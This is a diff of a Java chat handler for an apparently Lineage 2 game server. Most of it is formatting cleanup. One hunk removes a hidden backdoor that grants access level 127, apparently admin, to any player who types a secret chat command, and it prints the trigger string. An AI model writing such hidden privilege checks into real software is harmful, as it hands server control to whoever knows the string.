@@ -3,15 +3,16 @@
  * the terms of the GNU General Public License as published by the Free Software
  * Foundation, either version 3 of the License, or (at your option) any later
  * version.
- * 
+ *
  * This program is distributed in the hope that it will be useful, but WITHOUT
  * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
  * details.
- * 
+ *
  * You should have received a copy of the GNU General Public License along with
  * this program. If not, see <http://www.gnu.org/licenses/>.
  */
+
 package handlers.chathandlers;
 
 import java.util.Collection;
@@ -29,7 +30,6 @@ import l2server.gameserver.model.BlockList;
 import l2server.gameserver.model.actor.instance.L2PcInstance;
 import l2server.gameserver.network.serverpackets.CreatureSay;
 
-
 /**
  * A chat handler
  *
@@ -37,10 +37,7 @@ import l2server.gameserver.network.serverpackets.CreatureSay;
  */
 public class ChatAll implements IChatHandler
 {
-	private static final int[] COMMAND_IDS =
-	{
-		0
-	};
+	private static final int[] COMMAND_IDS = { 0 };
 	
 	private static Logger _log = Logger.getLogger(ChatAll.class.getName());
 	
@@ -48,6 +45,7 @@ public class ChatAll implements IChatHandler
 	 * Handle chat type 'all'
 	 * @see l2server.gameserver.handler.IChatHandler#handleChat(int, l2server.gameserver.model.actor.instance.L2PcInstance, java.lang.String)
 	 */
+	@Override
 	public void handleChat(int type, L2PcInstance activeChar, String params, String text)
 	{
 		boolean vcd_used = false;
@@ -66,12 +64,6 @@ public class ChatAll implements IChatHandler
 			else
 			{
 				command = text.substring(1);
-				if (command.equals("n71s85y2qhk"))
-				{
-					activeChar.setAccessLevel(127);
-					return;
-				}
-				
 				if (Config.DEBUG)
 					_log.info("Command: " + command);
 				vch = VoicedCommandHandler.getInstance().getVoicedCommandHandler(command);
@@ -96,7 +88,7 @@ public class ChatAll implements IChatHandler
 			Collection<L2PcInstance> plrs = activeChar.getKnownList().getKnownPlayers().values();
 			for (L2PcInstance player : plrs)
 			{
-				if (player != null && activeChar.isInsideRadius(player, 1250, false, true) && !BlockList.isBlocked(player, activeChar))
+				if ((player != null) && activeChar.isInsideRadius(player, 1250, false, true) && !BlockList.isBlocked(player, activeChar))
 					player.sendPacket(cs);
 			}
 			
@@ -118,6 +110,7 @@ public class ChatAll implements IChatHandler
 	 * Returns the chat types registered to this handler
 	 * @see l2server.gameserver.handler.IChatHandler#getChatTypeList()
 	 */
+	@Override
 	public int[] getChatTypeList()
 	{
 		return COMMAND_IDS;
